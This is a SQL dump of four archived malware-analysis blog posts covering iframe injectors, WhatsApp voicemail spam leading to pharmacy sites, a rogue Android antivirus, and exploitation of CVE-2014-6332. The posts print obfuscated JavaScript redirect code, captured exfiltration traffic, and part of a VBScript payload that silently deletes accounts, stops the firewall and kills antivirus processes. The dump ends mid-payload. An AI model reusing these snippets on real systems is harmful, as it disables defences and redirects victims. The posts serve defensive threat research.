INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1, '\n[Virus Bulletin Conference] The TAO of Automated Iframe Injectors - Building Drive-by Platforms For', 'Aditya K Sood', '2017-05-14T10:55:00-07:00', 'In this paper, we present the design of distributed infection model used by attackers to inject malicious iframes on the fly to conduct large scale drive-by download attacks. We use the term “Iframe Injectors” which refers to the automated tools used by attackers to trigger mass infections. The Iframe Injectors can either be standalone tools or embedded components as a part of the botnets. We discuss the classification of Iframe Injectors and dissect a number of existing tools to understand their functionalities and how they are deployed effectively.\n\nIframes are inline frames, which are HTML objects that are embedded in a web page to fetch content (HTML or JavaScript) from a third-party domain. The content is treated as a part of the primary web page and is served when that web page is accessed. This is a known HTML functionality and is heavily used for content sharing among multiple domains. However, attackers abuse this functionality in multiple variants of drive-by download attacks as a part of massive iframe infection campaigns. An attack starts with a malicious domain that hosts malware. The attackers then embed a URL referencing the malware in an iframe and place that in a compromised website (or any other self-managed website). Users are then coerced into visiting the web page that has the iframe embedded in it. When the user visits the page, the malware is fetched from the malicious domain and the end-user system is infected.\n\n\nFor complete details, the paper is available here: https://www.virusbulletin.com/virusbulletin/2016/10/tao-automated-iframe-injectors-building-driveby-platforms-fun-and-profit/\n\nPDF is available here: https://www.virusbulletin.com/uploads/pdf/magazine/2016/VB2016-Sood-Bansal.pdf', 'Cybercrime, Iframe injector, Malware, Virus Bulletin', 'https://secniche.blogspot.com/2017/05/virus-bulletin-conference-2016-tao-of.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (2, '\n[Updated] Nurturing JavaScript Obfuscation and Fast Flux DNS - \"Whats App Voicemail Spamming\"  for ', 'Aditya K Sood', '2015-09-29T22:31:00-07:00', 'Recently, we analyzed that spammers are doing \"Whats App Fake Voicemail\" spamming to trick end-users to visit online pharmacies\' websites. There are high chances that malware can be downloaded on to the end-user systems visiting these spamming websites. However, during this analysis, we did not notice that behavior.\n\nThe trend of \"Whats App Fake Voicemail\" spamming messages is not new as we have been encountering these spamming activities for last few years. There are not significant changes in the methods of sending \"Whats App Fake Voicemail\" notification messages which are used to lure end-users to visit illegitimate domains. However  from security research perspective, the target is to understand how this spamming attack is carried at the backend.  Since the \"Whats App\" organization brand is treated as a bait, as a result of which, there are high chances that people will click the links in the notification emails. This spamming attack is targeted against broad set of users on the Internet in order to redirect them to the online pharmacies\' outlets managed by Russian cyber actors. Check more on online pharmacies monetary model here : https://en.wikipedia.org/wiki/Online_pharmacy\n\nLet\'s perform the analysis. The end-user receives the email notification for \"Whats App Fake Voicemail\" message as follows:\n\n\n\n\n\nWhen end-user clicks the domain it is redirected to the malicious domain that serves following HTTP response headers as shown below. The landing web pages are hosted on Wordpress portal which looks like to be a compromised website. Let\'s take a close look on the HTTP response headers.\n\nGET /wp-content/themes/eStore/epanel/page_templates/js/educating.php HTTP/1.1\nHost pasarjagakarsa.com\nUser-Agent Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0\nAccept text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language en-US,en;q=0.5\nAccept-Encoding gzip, deflate\nConnection keep-alive\n\n(Status-Line) HTTP/1.1 404 Not Found\nServer nginx\nDate Tue, 29 Sep 2015 19:32:40 GMT\nContent-Type text/html\nTransfer-Encoding chunked\nConnection keep-alive\nVary Accept-Encoding\nX-Powered-By PHP/5.4.44\nContent-Encoding gzip\n\nIf you see the highlighted part in the HTTP response headers, it shows \"404 Not Found\" error which generally means resource does not exist on the web server. Infact it is not true, the web server responded back with following content as a part of web page.\n\n\n\n\n\n\n\n\nBefore going further, check our earlier articles on JavaScript de-obfuscation\n\n\n\nhttp://secniche.blogspot.com/2012/04/javascript-obfuscation-manual-armor-1.html\nhttp://secniche.blogspot.com/2012/04/javascript-obfuscation-manual-armor-2.html\nhttp://secniche.blogspot.com/2011/04/javascript-camouflaging-primer.html \n\n\n\nIf you notice, the web page has an obfuscated JavaScript embedded in it. Let\'s extract the obfuscated JavaScript as shown below:\n\n\n\n\n\n\n\n\n\nThe obfuscated JS is not that complex and it can be de-obfuscated easily. On de-obfuscation it was observed that the user\'s browser was further redirected to the following domain: \"hxxp://magicorganicmarket.ru\" as shown below:\n\n\n\n\n\n\n\n\n\nDue to misconfiguration on the landing domain:\"hxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/educating.php\" , the directory listing was obtained as follows:\n\n\n\n\n\n\n\n\n\n\nSeveral other malicious links with obfuscated JavaScripts were obtained and presented as follows:\n\n \n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/chatterer.php\n\n\n\nfunction celle() { cella=72; cellb=[191,177,182,172,183,191,118,188,183,184,118,180,183,171,169,188,177,183,182,118,176,186,173,174,133,111,176,188,188,184,130,119,119,182,169,188,189,186,169,180,176,173,186,170,187,183,189,188,180,173,188,118,186,189,111,131]; cellc=\"\"; for(celld=0;celld<cellb.length;celld++) { cellc+=String.fromCharCode(cellb[celld]-cella); } return cellc; } setTimeout(celle(),1306);\n\n\n\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://naturalherbsoutlet.ru/\n\n\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/elimination.php\n\n\n\nfunction sicklee() { sicklea=42; sickleb=[161,147,152,142,153,161,88,158,153,154,88,150,153,141,139,158,147,153,152,88,146,156,143,144,103,81,146,158,158,154,100,89,89,145,143,152,143,156,147,141,139,147,142,141,153,151,154,139,152,163,88,156,159,81,101]; sicklec=\"\"; for(sickled=0;sickled<sickleb.length;sickled++) { sicklec+=String.fromCharCode(sickleb[sickled]-sicklea); } return sicklec; } setTimeout(sicklee(),1276);\n\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://genericaidcompany.ru/\n\n \n\n \n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/fresnel.php\n\n\n\nfunction timee() { timea=58; timeb=[177,163,168,158,169,177,104,174,169,170,104,166,169,157,155,174,163,169,168,104,162,172,159,160,119,97,162,174,174,170,116,105,105,167,159,158,163,157,155,166,173,155,160,159,173,159,172,176,163,157,159,173,104,172,175,97,117]; timec=\"\"; for(timed=0;timed<timeb.length;timed++) { timec+=String.fromCharCode(timeb[timed]-timea); } return timec; } setTimeout(timee(),1292);\n\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://medicalsafeservices.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/sensitive.php\n\n\n\nfunction risee() { risea=80; riseb=[199,185,190,180,191,199,126,196,191,192,126,188,191,179,177,196,185,191,190,126,184,194,181,182,141,119,184,196,196,192,138,127,127,192,181,194,182,181,179,196,184,181,194,178,195,199,181,178,189,177,194,196,126,194,197,119,139]; risec=\"\"; for(rised=0;rised<riseb.length;rised++) { risec+=String.fromCharCode(riseb[rised]-risea); } return risec; } setTimeout(risee(),1314);\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://perfectherbswebmart.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/reclaimers.php\n\n\n\nfunction likede() { likeda=62; likedb=[181,167,172,162,173,181,108,178,173,174,108,170,173,161,159,178,167,173,172,108,166,176,163,164,123,101,166,178,178,174,120,109,109,173,172,170,167,172,163,176,163,171,163,162,183,180,159,170,179,163,108,176,179,101,121]; likedc=\"\"; for(likedd=0;likedd<likedb.length;likedd++) { likedc+=String.fromCharCode(likedb[likedd]-likeda); } return likedc; } setTimeout(likede(),1296);\n Online Pharmacy Website after De-obfuscating JS Code: hxxp://onlineremedyvalue.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/reclaimers.php\n\nfunction politye() { politya=38; polityb=[157,143,148,138,149,157,84,154,149,150,84,146,149,137,135,154,143,149,148,84,142,152,139,140,99,77,142,154,154,150,96,85,85,148,135,154,155,152,135,146,150,143,146,146,147,135,146,146,84,152,155,77,97]; polityc=\"\"; for(polityd=0;polityd<polityb.length;polityd++) { polityc+=String.fromCharCode(polityb[polityd]-politya); } return polityc; } setTimeout(politye(),1272);\n Online Pharmacy Website after De-obfuscating JS Code: hxxp://naturalpillmall.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/reclaimers.php\n\nfunction travellere() { travellera=56; travellerb=[175,161,166,156,167,175,102,172,167,168,102,164,167,155,153,172,161,167,166,102,160,170,157,158,117,95,160,172,172,168,114,103,103,160,157,170,154,153,164,160,167,172,168,173,170,155,160,153,171,157,102,170,173,95,115]; travellerc=\"\"; for(travellerd=0;travellerd<travellerb.length;travellerd++) { travellerc+=String.fromCharCode(travellerb[travellerd]-travellera); } return travellerc; } setTimeout(travellere(),1290);\n Online Pharmacy Website after De-obfuscating JS Code: hxxp://herbalhotpurchase.ru/\n[Updates]\n\n\nAll the information and orders are actually handled by this primary outlet - hxxps://checkoutucxefvfq.fastcheckoutrx.com/\n\n\n\n\n\n\n\nWe performed tests at the network level to understand on how the name servers were configured and we found that DNS fluxing was used in this campaign. The Time-To-Live (TTL) field is set for 600 seconds and after the IP address of the domain changes. \n\n\n\nHere is an example:\n\n\n\nperfectherbswebmart.ru. 600 IN A 82.199.121.167\n\nperfectherbswebmart.ru. 600 IN A 198.144.158.52\n\n\n\nSome analytical points for consideration:\n\n\n\nOverall extensive \".ru\" domains have been used in this spamming campaign.\nOne can conclude that automated spam-code generation tools have been used in this campaign to ease out the process of large scale infection\n\nFor example:- infecting PHP pages with JavaScript obfuscated code hosted on the compromised websites\n\nThe campaign looks like to be executed at an extensive level considering the artefacts.\n\nMany similar instances of JavaScript obfuscation have been analyzed as presented above\nA number of online pharmacy websites found after de-obfuscating the JavaScript:\n\nhxxp://herbalhotpurchase.ru/\nhxxp://naturalpillmall.ru/\nhxxp://onlineremedyvalue.ru/\nhxxp://perfectherbswebmart.ru/\nhxxp://medicalsafeservices.ru/\nhxxp://genericaidcompany.ru/\nhxxp://naturalherbsoutlet.ru/\n\n\n\n\nWe believe that this is just the tip of the iceberg and there will be many more\n\n\nWe won\'t be surprised if the same tactics are used for drive-by download instead of spamming in particular.\n\n\n\nNote: At the time of drafting this post, all the websites were active.\n\nStay Secure !', 'Cybercrime, Malware Obfuscation, Whats App', 'https://secniche.blogspot.com/2015/09/nurturing-javascript-obfuscation-whats.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (3, '\n\"Armor for Android\" - Rogue Marketing but Real Business - Who Cares for Ethics !\n', 'Aditya K Sood', '2015-05-11T11:14:00-07:00', 'Malvertisements and Fake AVs Outline: Since Android is an open-source mobile platform, it is targeted by attackers for malicious purposes. Android applications are served through malicious advertisements. One of the widely used technique is to raise fake anti-virus alerts in the form of advertisements and then providing a fake solution in the form of anti-virus application which is basically nothing but a malicious application designed either to steal information or asking for some ransom or asking for money to activate the license of fake anti-virus. One or the other way, information or money is desired from the end-users by selling \"risk or threat\" through malicious advertisements. All of this is fake but the end-users who are not knowledgeable fall for this trap and end up either providing money or information.\n\nInterestingly, businesses are also using the nefarious tactics to scare the users to install applications through dubious means. Read this for the reality of \"Android for Armor\" http://www.androidauthority.com/armor-for-android-342192/. Several outlets call \"Armor for Android\" application as rogue. Interestingly, \"Android for Armor\" built its business using information provided by VirusTotal.com as highlighted here by the Naked Security blog post - https://nakedsecurity.sophos.com/2013/01/10/a-chink-in-android-armour/. Even the virus-total now considered this application as malicious - https://www.virustotal.com/en/file/af518ec81e4ddb7b08048b7924c7f63e55c654a702f5c62ebf3e83d39c51bab2/analysis/1430705447/\n\nWe have been watching this trend for couple of months and thought to do a brief analysis of this complete process. We still treat this application as fake or rogue based on the methods use to install Android application on the end-users\' phones.\n\nLet\'s take a look at the recent malicious advertisement campaign for installing \"Armor for Android\", a so-called authentic application which is advertised to provide effective anti-virus services. Amazingly, \"Armor for Android\" is still rolling in the market despite of such bad business practices and latest campaign is discussed in this post.  The questions that need critical thinking are:\n\nIs there any value in ethical business models in online advertisements?\nHow can we obtain users\' trust if rogue business tactics are used?\n\nLet\'s take a look into installation (alias to malvertisement) process of \"Armor-for-Android\" application step-by-step:\n\nStep 1: The landing website generates an error notification as shown below and highlights that users\'s Galaxy Nexus phone is infected.\n\n\n\n\n\n Step 2: After accepting the notification, it is highlighted that underlined system is infected with \"Hornyworm.apk\".\n\n\n\n\n\n\n\n\nStep 3: After a time interval of few seconds, a fake message appears which shows that the user\'s Android phone is in scanning phase and it offers a solution to download an anti-virus application.\n\n\n\n\n\n\n\n\n\nStep 4: After a few seconds, an Android application is served as follows:\n\n\n\n\n\n\n\n\n\nStep 5: The website also shows how exactly the application needs to be installed.\n\n\n\n\n\n\n\nThe complete HTTP network flow is presented below to show various websites that are hopped by the end-user\'s Android phone.\n\n 02:02:34.141     2.050     734     1383     GET     200     text/html     http://www.cellphoneupdated.com/fatalvirus/us/106/index.php?countryname=United%20States&model=Galaxy%20Nexus&brand=Samsung&isp=Nobis%20Technology%20Group%2C%20LLC&voluumdata=vid..00000003-87e9-496c-8000-000000000000__vpid..5226a000-bf41-11e4-8376-93ef5ad96b35__caid..a88aabcb-264f-46ba-9801-a85f36f00867__lid..1b71b07a-7436-46e5-981f-f6273dfbcbb5__rt..DJ__oid1..4e28fd07-1e86-4ea9-9d0e-bdcfc0d9ffd1__var1..U  \n 02:02:36.216     0.056     749     (1965)     GET     (Cache)     application/x-javascript     http://www.cellphoneupdated.com/fatalvirus/us/106/backfix.min.js  \n 02:03:39.010     0.020     805     (82)     GET     (Cache)     text/html     http://www.cellphoneupdated.com/fatalvirus/us/106/blank.html  \n 02:03:39.772     0.060     897     (214)     GET     304     text/html     http://www.cellphoneupdated.com/fatalvirus/us/106/blank.html?HistoryLoad  \n 02:03:43.045     2.351     947     222     GET     200     text/html     http://track.cellphoneupdated.com/click  \n 02:03:45.492     2.083     657     625     GET     200     text/html     http://1nxoz.redirectvoluum.com/redirect?target=http%3A%2F%2Fhop.armorforandroid.net%2Fgo%2Faa.aff%3Faffid%3D10027%26v_campaign%3Dyd447a9ysnrwv44b2m8p97au545hqbpnqrqv%26subid%3DdQ31FAIBI19DCGGI0DIHGN46&ts=1425257252676&hash=zuiF0czwgopTMlbFFybUElFtRrEzh08G4HY3fKQ%2FH%2FQ%3D&rm=DJ  \n 02:03:47.618     2.253     749     846     GET     302     Redirect to: http://www.fastermobile.org/v3e/index.html?pop=1&version=release-search&strat=2&page=aa.matt.5svp.0830&split=c9c82b85.control&ccrule=fcc98f53&offer=aa.gi.default&product=anti-virus&partner=afacom&country=xx&language=en&pool=9d05eb72&affid=10027&v_campaign=yd447a9ysnrwv44b2m8p97au545hqbpnqrqv&subid=dQ31FAIBI19DCGGI0DIHGN46&shortcut=aa.aff&ipcc=us&iprc=ca&xsid=rfAdNVge1k6VR8ctHV7h2A&ccconfigid=a29869e5.140812     http://hop.armorforandroid.net/go/aa.aff?affid=10027&v_campaign=yd447a9ysnrwv44b2m8p97au545hqbpnqrqv&subid=dQ31FAIBI19DCGGI0DIHGN46  \n 02:03:49.959     0.148     1028     215     GET     303     Redirect to: /k/7s5jJPFpAdahNMbjZEbNCMUqOd4WD_sQ3Y9g7f0zBqYfUf7BRJw1jg2/fdu8903/index.html?pop=1&version=release-search&strat=2&page=aa.matt.5svp.0830&split=c9c82b85.control&ccrule=fcc98f53&offer=aa.gi.default&product=anti-virus&partner=afacom&country=xx&language=en&pool=9d05eb72&affid=10027&v_campaign=yd447a9ysnrwv44b2m8p97au545hqbpnqrqv&subid=dQ31FAIBI19DCGGI0DIHGN46&shortcut=aa.aff&ipcc=us&iprc=ca&xsid=rfAdNVge1k6VR8ctHV7h2A&ccconfigid=a29869e5.140812     http://www.fastermobile.org/v3e/index.html?pop=1&version=release-search&strat=2&page=aa.matt.5svp.0830&split=c9c82b85.control&ccrule=fcc98f53&offer=aa.gi.default&product=anti-virus&partner=afacom&country=xx&language=en&pool=9d05eb72&affid=10027&v_campaign=yd447a9ysnrwv44b2m8p97au545hqbpnqrqv&subid=dQ31FAIBI19DCGGI0DIHGN46&shortcut=aa.aff&ipcc=us&iprc=ca&xsid=rfAdNVge1k6VR8ctHV7h2A&ccconfigid=a29869e5.140812  \n 02:03:50.154     0.113     1090     3072     GET     200     text/html     http://www.fastermobile.org/k/7s5jJPFpAdahNMbjZEbNCMUqOd4WD_sQ3Y9g7f0zBqYfUf7BRJw1jg2/fdu8903/index.html?pop=1&version=release-search&strat=2&page=aa.matt.5svp.0830&split=c9c82b85.control&ccrule=fcc98f53&offer=aa.gi.default&product=anti-virus&partner=afacom&country=xx&language=en&pool=9d05eb72&affid=10027&v_campaign=yd447a9ysnrwv44b2m8p97au545hqbpnqrqv&subid=dQ31FAIBI19DCGGI0DIHGN46&shortcut=aa.aff&ipcc=us&iprc=ca&xsid=rfAdNVge1k6VR8ctHV7h2A&ccconfigid=a29869e5.140812  \n 02:03:50.293     0.145     864     1025     GET     200     text/css     http://www.fastermobile.org/k/7s5jJPFpAdahNMbjZEbNCMUqOd4WD_sQ3Y9g7f0zBqYfUf7BRJw1jg2/fdu8903/a.css  \n 02:03:50.312     0.046     877     (0)     GET     (Cache)     application/javascript     http://cdnjs.cloudflare.com/ajax/libs/zepto/1.1.4/zepto.min.js  \n 02:03:50.330     0.232     879     891     GET     200     image/png     http://www.fastermobile.org/k/7s5jJPFpAdahNMbjZEbNCMUqOd4WD_sQ3Y9g7f0zBqYfUf7BRJw1jg2/fdu8903/z.png  \n 02:03:50.473     0.144     837     455     GET     200     application/x-javascript     http://antivirus.trafficmanager.net/threatCount?range=7&callback=jsonp1&_=1425257258028  \n 02:03:50.498     0.252     799     226     GET     200     application/javascript     http://api.handsetdetection.com/sites/js/32266.js  \n 02:03:50.525     0.285     877     167     GET     204     text/plain     http://pixel.sitescout.com/iap/14b1248479c050b7  \n 02:03:50.563     0.165     506     824     GET     200     image/png     http://www.fastermobile.org/k/7s5jJPFpAdahNMbjZEbNCMUqOd4WD_sQ3Y9g7f0zBqYfUf7BRJw1jg2/fdu8903/p.png  \n 02:03:50.583     0.370     539     35219     GET     200     application/x-font-ttf     http://www.fastermobile.org/k/7s5jJPFpAdahNMbjZEbNCMUqOd4WD_sQ3Y9g7f0zBqYfUf7BRJw1jg2/fdu8903/font.ttf  \n 02:03:54.517     0.178     1278     2382     GET     200     text/html     http://www.fastermobile.org/k/7s5jJPFpAdahNMbjZEbNCMUqOd4WD_sQ3Y9g7f0zBqYfUf7BRJw1jg2/fdu8903/i.html?pop=1&version=release-search&strat=2&page=aa.matt.5svp.0830&split=c9c82b85.control&ccrule=fcc98f53&offer=aa.gi.default&product=anti-virus&partner=afacom&country=xx&language=en&pool=9d05eb72&affid=10027&v_campaign=yd447a9ysnrwv44b2m8p97au545hqbpnqrqv&subid=dQ31FAIBI19DCGGI0DIHGN46&shortcut=aa.aff&ipcc=us&iprc=ca&xsid=rfAdNVge1k6VR8ctHV7h2A&ccconfigid=a29869e5.140812  \n 02:03:54.738     0.151     861     1085     GET     200     text/css     http://www.fastermobile.org/k/7s5jJPFpAdahNMbjZEbNCMUqOd4WD_sQ3Y9g7f0zBqYfUf7BRJw1jg2/fdu8903/aa.css  \n 02:03:54.757     0.031     873     (0)     GET     (Cache)     application/javascript     http://cdnjs.cloudflare.com/ajax/libs/zepto/1.1.4/zepto.min.js  \n 02:03:54.924     0.056     787     (1560)     GET     (Cache)     application/x-javascript     http://connect.facebook.net/en_US/fbds.js  \n 02:03:54.950     0.240     873     167     GET     204     text/plain     http://pixel.sitescout.com/iap/0770a2fc94ca2cbc  \n 02:03:55.018     2.176     2106     334     POST     200     image/gif     https://www.facebook.com/tr/  \n 02:03:57.279     2.584     1205     3.2M     GET     200     application/vnd.android.package-archive     http://dlhub1.com/download/full?pop=1&version=release-search&strat=2&page=aa.matt.5svp.0830&split=c9c82b85.control&ccrule=fcc98f53&offer=aa.gi.default&product=anti-virus&partner=afacom&country=xx&language=en&pool=9d05eb72&affid=10027&v_campaign=yd447a9ysnrwv44b2m8p97au545hqbpnqrqv&subid=dQ31FAIBI19DCGGI0DIHGN46&shortcut=aa.aff&ipcc=us&iprc=ca&xsid=rfAdNVge1k6VR8ctHV7h2A&ccconfigid=a29869e5.140812  \n 02:04:05.722     0.165     507     14521     GET     200     image/png     http://www.fastermobile.org/k/7s5jJPFpAdahNMbjZEbNCMUqOd4WD_sQ3Y9g7f0zBqYfUf7BRJw1jg2/fdu8903/x.png  \n\nThe application looks like as shown below and it asks for user\'s credit or debit card information in order to conduct transaction so that fake anti-virus application can be installed after getting a license. Its all basically a fake process.\n\n\n\n\nAssets Information:\n\nparameters.json {\n  \"bugsense_key\": \"f75779a2\",\n  \"analytics_key\": \"01c0994d555ea19e1ef7e0e5b69c9dab\",\n  \"security_key\": \"ca9u\",\n  \"quick_scan\": \"true\",\n  \"device_threats\": \"false\"\n}\n\nversion.json {\n  \"configuration\": \"1983\",\n  \"pop\": \"1\",\n  \"version\": \"release-search\",\n  \"strat\": \"2\",\n  \"page\": \"aa.matt.5svp.0830\",\n  \"split\": \"c9c82b85.control\",\n  \"ccrule\": \"fcc98f53\",\n  \"offer\": \"aa.gi.default\",\n  \"product\": \"anti-virus\",\n  \"partner\": \"afacom\",\n  \"country\": \"xx\",\n  \"language\": \"en\",\n  \"pool\": \"9d05eb72\",\n  \"affid\": \"10027\",\n  \"v_campaign\": \"yd447a9ysnrwv44b2m8p97au545hqbpnqrqv\",\n  \"subid\": \"dAF08D9FUE813PVJ0PNAMH6O\",\n  \"shortcut\": \"aa.aff\",\n  \"ipcc\": \"us\",\n  \"iprc\": \"ca\",\n  \"xsid\": \"FyY0MUJgP0-AitmpO62mVw\",\n  \"ccconfigid\": \"a29869e5.140812\"\n}\n\nRead/Write Operations are shown below:\n\nwrite /data/data/com.armorforandroid.security/shared_prefs/APP_PREFS_LOCKED.xml|\nread         /data/data/com.android.music/shared_prefs/Music.xml|\nwrite /data/data/com.armorforandroid.security/shared_prefs/APP_PREFS_LOCKED.xml|\nwrite /data/data/com.armorforandroid.security/shared_prefs/APP_PREFS_LOCKED.xml|\nread        /data/data/com.android.browser/shared_prefs/com.android.browser_preferences.xml|\nread        /data/data/com.android.mms/shared_prefs/_has_set_default_values.xml|\nread        /data/data/com.android.mms/shared_prefs/com.android.mms_preferences.xml|\n\nDevice ID submitted as follow:\n\nPOST /api/submit?deviceId=d3rqs2c37m&version=349 HTTP/1.1\nContent-Type: application/json; charset=utf-8\nUser-Agent: Dalvik/1.4.0 (Linux; U; Android 2.3.4; generic Build/GRJ22)\nHost: url.armorforandroid.net\nConnection: Keep-Alive\nContent-Length: 641\nAccept-Encoding: gzip\n\nData Exfiltration:\n\nPOST /innilytics/upload/01c0994d555ea19e1ef7e0e5b69c9dab HTTP/1.1\nContent-Type: application/x-gzip\nContent-Length: 1558\nHost: innilytics.cloudapp.net\nConnection: Keep-Alive\nUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)\n\n...........WYo.7.~....,..\\.~..&h.6.&@Q..Oy.=.=....{g.R\".).......c...o.O|........a\\.,......M,.....A....\"pbyH.q.t*`...).J.R.r.........3.;...i./...}W.M....?.........&.\".eP*D.Tp..%<51...$]`.J.4OV)Zp....pL....i:p..m.+....}.\"/Y..=o......Q@.:G.@.KW@.V.n<!J..6<*o.g...;].2.\\.ESA.....\'^R....:..k.#;...4k.c.,ep1#..2Zf\".IE..+.7.:..z..t.1..e...3.5.......1...v.k......|..Z..Y.y..2.2&..eID...Pz.z...L.0...R.......x........./..q.=...AK......l$.)C<-D..K....Z..p.x.1.....R....B.x..\\.~..v...a..<x.{.g....v.k.k..o.>u....!....k..a\"..m..&..(1.C.l..;....w5...j< yot.....r....5..,..l.n...f2G.C.v.@..r........F..&.B...#...H..SWU.6c...C.-.g.!.=.9..O...<y.X3...S....O..?.......V[,.u..[s=......h..(;I!....../.1....5..y.5..&D7m...c?...m\'.p.......v=..#......y.isZ.}........iNVl...@.< }.l.\\....j./j..K.....Yq.9.\\..m.X.o.K7l.T......o.n.}...[w.f<d6.Z.s]o.*....(O..w..L...v.d......Y..~.gH...Q...3.....5...Tq@...9..x.!..[h.x_..\"7.j.f..h...K)...............8...0y\\.-..]..>h.{....?X...P?.9..]....d........N)(..2.o......_.O/.n.SrZ.....h^]...^......V.....q..........c..e...?x>..l6.ztS..L^.?..Uk.....F. ...95...9..-b...L.d..l.uc....V....|ys...;.@...1..l...*ZOx.4.X...u......mf..N..5....].#).Y..G}..........vy......>C>..B..... .4.8..1!.B..(..\"...........1.;..+..`....=Q..._A....G.....>E[....#._...P.?.......q.g.f.C.J ...Wq..UP....H...........fy4.........(:......-^....d......AJW.D{...(..........x....x....+.....(...jI........J\"....F$..O..~j.z.|......[..Gv.E9z..........P.P l\"$3D..z.m.t..d.}....~...._G$..oV..@..[.Z.....9..E...r..x..y~..Un....,.%3`N.R..J..\\\".%.... 0S.\"(q.ER......v......\n\nHTTP/1.1 200 OK\nCache-Control: private\nServer: Microsoft-IIS/7.5\nX-AspNetMvc-Version: 3.0\nX-AspNet-Version: 4.0.30319\nX-Powered-By: ASP.NET\nDate: Mon, 04 May 2015 01:36:51 GMT\nContent-Length: 0\n\nVirus Total - https://www.virustotal.com/en/file/af518ec81e4ddb7b08048b7924c7f63e55c654a702f5c62ebf3e83d39c51bab2/analysis/1430705447/\n\nAt the time of this post, the link is still active : hxxp://www.cellphoneupdated.com/fatalvirus/us/106/index.php?countryname=United%20States&model=Galaxy%20Nexus&brand=Samsung&isp=Nobis%20Technology%20Group%2C%20LLC&voluumdata=vid..00000003-87e9-496c-8000-000000000000__vpid..5226a000-bf41-11e4-8376-93ef5ad96b35__caid..a88aabcb-264f-46ba-9801-a85f36f00867__lid..1b71b07a-7436-46e5-981f-f6273dfbcbb5__rt..DJ__oid1..4e28fd07-1e86-4ea9-9d0e-bdcfc0d9ffd1__var1..U\n\nBeware of these kinds of applications !', 'android malware, Armor for Android, malicious applications, mobile exploitation, Mobile Threats', 'https://secniche.blogspot.com/2015/05/armor-for-android-rogue-marketing-but.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (4, '\nA Real World Story of CVE-2014-6332 : RCE and Malware Download via VBScript !\n', 'Aditya K Sood', '2015-03-14T22:06:00-07:00', 'Recently, we have observed in our analysis that the exploit code for vulnerability with identifier CVE-2014-6332 is either directly embedded in the webpages of the infected website or used as a part of  Browser Exploits Packs (BEPs) for downloading malware and executing commands remotely.\n\nEarlier, we have discussed about how Chinese domains served almost the similar exploits taken from MetaSploit (http://secniche.blogspot.com/2013/03/malware-retrospective-infected-chinese.html) to trigger infections. However, the attackers tweak the structure of exploits as per the requirements in order to conduct successful infections on the fly through compromised websites.\n\nLet\'s discuss the vulnerability in question. From Internet: \"CVE-2014-6332: OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows remote attackers to execute arbitrary code via a crafted web site, as demonstrated by an array-redimensioning attempt that triggers improper handling of a size value in the SafeArrayDimen function, aka \"Windows OLE Automation Array Remote Code Execution Vulnerability.\" \n\nRefer: Metasploit Module (http://downloads.securityfocus.com/vulnerabilities/exploits/70952.rb) and Microsoft advisory on the subject (https://technet.microsoft.com/en-us/library/security/ms14-064.aspx)\n\nTrend Micro has some discussed about this vulnerability (http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/) so we do now want to discuss that in detail.\n\nTwo variants of VBScript have been found that are used in conjunction with this vulnerability which are discussed below. The primary structure of the exploit remains the same but payload is solely based on the VBScript code embedded in the webpages or BEPs.\n\nAs you can see, \"cmd.exe\" is triggered with options \"/q, /c\" which forces the Windows to execute command without echoing the output which means commands are executed without any notifications in the Windows GUI. Other insights:\n\nThe Norton \"360.exe\" process is killed and several other commands are executed.\n\n <script language=\"VBScript\">  \n function runmumaa()   \n On Error Resume Next  \n set shell=createobject(\"wscript.shell\")  \n shell.run \"cmd.exe /q /c net user admin /del\",0  \n shell.run \"cmd.exe /q /c sc stop sharedaccess\",0  \n shell.run \"cmd.exe /q /c md C:\\RECYCLER\",0  \n shell.run \"cmd.exe /q /c taskkill /f /im 360rp.exe\",0  \n shell.run \"cmd.exe /q /c taskkill /f /im 360sd.exe\",0  \n shell.run \"cmd.exe /q /c taskkill /f /im 360tray.exe\",0  \n shell.run \"cmd.exe /q /c taskkill /f /im arp2.exe\",0  \n shell.run \"cmd.exe /q /c taskkill /f /im 360.exe\",0  \n shell.run \"cmd.exe /q /c taskkill /f /im 361.exe\",0  \n shell.run \"cmd.exe /q /c ping 127.0.0.1 -n 200&taskkill /f /im fp.exe&taskkill /f /im ftp.exe&taskkill /f /im arp1.exe&taskkill /f /im arp2.exe&taskkill /f /im fa1.exe&taskkill /f /im fa2.exe&taskkill /f /im fa.exe\",0  \n shell.run \"cmd.exe /q /c del C:\\docume~1\\alluse~1\\¡¸¿ªÊ¼¡¹²Ëµ¥\\³ÌÐò\\Æô¶¯\\360.exe\",0  \n shell.run \"cmd.exe /q /c del C:\\docume~1\\alluse~1\\¡¸¿ªÊ¼¡¹²Ëµ¥\\³ÌÐò\\Æô¶¯\\361.exe\",0  \n shell.run \"cmd.exe /q /c del C:\\RECYCLER\\360.exe\",0  \n 